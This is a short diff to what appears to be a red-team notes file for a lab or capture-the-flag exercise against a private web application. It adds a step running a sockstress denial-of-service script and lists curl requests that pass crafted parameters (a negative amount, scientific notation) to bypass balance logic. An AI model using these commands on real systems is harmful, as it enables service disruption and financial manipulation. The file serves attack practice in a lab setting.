@@ -51,6 +51,9 @@ Red:
         curl "http://10.1.5.2/process.php?user=john&pass=abcdef&drop=balance"
         curl "http://10.1.5.2/process.php?user=kelly&pass=abcdef&drop=balance"
 
+    6. Sockstress
+        run sockstress.sh with parameters 10.1.5.2:80 ethx -p payloads/http
+
     6. Interesting
     curl "http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance" -> bypasses the drop=balance going to the default option.
     curl "http://10.1.5.2/process.php?user=random&pass=aaaa&amount=0.23e5&drop=deposit" -> reads number elevated to the power after e.
